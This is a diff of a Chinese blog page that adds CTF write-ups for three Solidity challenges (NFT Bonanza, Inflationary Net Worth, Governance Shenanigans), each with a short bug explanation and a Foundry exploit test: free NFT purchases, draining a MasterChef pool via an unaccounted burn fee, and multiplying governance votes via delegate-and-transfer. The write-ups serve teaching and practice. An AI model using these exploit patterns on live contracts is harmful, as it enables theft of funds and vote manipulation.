@@ -344,21 +344,21 @@ publicSaleMint方法有一个修饰符isEOA()，绕过她十分简单，">
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2023-09-08
+                    2023-09-09
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1.1k
+                    1.6k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    5 分
+                    8 分
                 </div>
                 
 
@@ -639,7 +639,112 @@ address(safuWalletLibrary).call(data);
     }
 }
 </code></pre>
-<h2 id="NFT-Bonanza"><a href="#NFT-Bonanza" class="headerlink" title="NFT Bonanza"></a>NFT Bonanza</h2><h2 id="Inflationary-Net-Worth"><a href="#Inflationary-Net-Worth" class="headerlink" title="Inflationary Net Worth"></a>Inflationary Net Worth</h2>
+<h2 id="NFT-Bonanza"><a href="#NFT-Bonanza" class="headerlink" title="NFT Bonanza"></a>NFT Bonanza</h2><pre><code>    vm.prank(admin);
+    nftA = new Nft721('APES','APES');
+    vm.prank(admin);
+    nftB = new Nft721('ApEs','ApEs');
+</code></pre>
+<p>可以看到我们要盗取的NFT皆为NFT721。</p>
+<p>我们观察buyItem()方法，它有很大的漏洞，当我们买NFT721，即使 _quantity为0，我们依然能得到。因为与_quantity无关。</p>
+<pre><code>IERC721(_nftAddress).safeTransferFrom(_owner, _msgSender(), _tokenId);
+</code></pre>
+<pre><code>    /// solves the challenge
+    function testChallengeExploit() public {
+        vm.startPrank(attacker,attacker);
+        
+        bonanzaMarketplace.buyItem(address(nftA),0,adminUser,0);
+        bonanzaMarketplace.buyItem(address(nftB),0,adminUser,0);
+
+        vm.stopPrank();
+        validation();
+    }
+</code></pre>
+<h2 id="Inflationary-Net-Worth"><a href="#Inflationary-Net-Worth" class="headerlink" title="Inflationary Net Worth"></a>Inflationary Net Worth</h2><pre><code>// Deposit LP tokens to MasterChef for MUNY allocation.
+function deposit(uint256 _pid, uint256 _amount) public {
+    PoolInfo storage pool = poolInfo[_pid];
+    UserInfo storage user = userInfo[_pid][msg.sender];
+    updatePool(_pid);
+    if (user.amount &gt; 0) {
+        uint256 pending = user.amount.mul(pool.accMunyPerShare).div(1e12).sub(user.rewardDebt);
+        safeMunyTransfer(msg.sender, pending);
+    }
+    pool.lpToken.safeTransferFrom(address(msg.sender), address(this), _amount);
+    user.amount = user.amount.add(_amount);
+    user.rewardDebt = user.amount.mul(pool.accMunyPerShare).div(1e12);
+    emit Deposit(msg.sender, _pid, _amount);
+}
+
+// Withdraw without caring about rewards. EMERGENCY ONLY.
+function emergencyWithdraw(uint256 _pid) public {
+    PoolInfo storage pool = poolInfo[_pid];
+    UserInfo storage user = userInfo[_pid][msg.sender];
+    pool.lpToken.safeTransfer(address(msg.sender), user.amount);
+    emit EmergencyWithdraw(msg.sender, _pid, user.amount);
+    user.amount = 0;
+    user.rewardDebt = 0;
+}
+</code></pre>
+<p>很明显，在deposite与withdraw方法中，并未将销毁5%计算在内。</p>
+<pre><code>// solves the challenge
+
+function testChallengeExploit() public {
+    vm.startPrank(attacker, attacker);
+     
+    //减少 MasterChef 内的 lpSupply，直到我们无法提取存入的金额
+    bool first = true;
+    uint count;
+    uint amount;
+
+    while (mula.balanceOf(address(masterChef)) &gt; amount || first) {
+        if (first) {
+            first = false;
+        } else {
+            masterChef.emergencyWithdraw(0);
+            console.log("balance attacker - withdraw: ", mula.balanceOf(address(attacker)));
+            console.log("balance masterChef - withdraw: ", mula.balanceOf(address(masterChef)));
+        }
+        masterChef.deposit(0, mula.balanceOf(address(attacker)));
+        ++count;
+    }
+
+    masterChef.withdraw(0, mula.balanceOf(address(masterChef)) - 1);
+
+    vm.stopPrank();
+    validation();
+}
+</code></pre>
+<h2 id="Governance-Shenanigans"><a href="#Governance-Shenanigans" class="headerlink" title="Governance Shenanigans"></a>Governance Shenanigans</h2><p>_delegate()和_moveDelegates()的逻辑很奇怪，即使金额为0，我们也能更新 _delegates[delegator]。并且操作后token依然是delegator的。</p>
+<p>那么一个账户给attacker进行delegate后，可以将token转到其它账户中，这样就可以在钱转回来后再次为attacker进行delegate。</p>
+<pre><code>// solves the challenge
+
+function testChallengeExploit() public {
+    vm.startPrank(attacker);
+    governanceToken.transfer(o1, governanceToken.balanceOf(attacker));
+    vm.stopPrank();
+
+    for (uint i; i &lt; 3; ++i) {
+        vm.startPrank(o1);
+        governanceToken.delegate(attacker); 
+        governanceToken.transfer(o2, governanceToken.balanceOf(o1));
+
+        governanceToken.delegate(address(0)); 
+        vm.stopPrank();
+
+        vm.startPrank(o2);
+        governanceToken.delegate(attacker); 
+        governanceToken.transfer(o1, governanceToken.balanceOf(o2));
+        governanceToken.delegate(address(0));
+        vm.stopPrank();
+    }
+
+    vm.startPrank(o1);
+    governanceToken.transfer(attacker, governanceToken.balanceOf(o1));
+    vm.stopPrank();
+
+    validation();
+}
+</code></pre>
+
                 
             </div>
             <hr/>
@@ -1102,7 +1207,7 @@ address(safuWalletLibrary).call(data);
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">8.3k</span>
+                        class="white-color">10.8k</span>
             
             
             
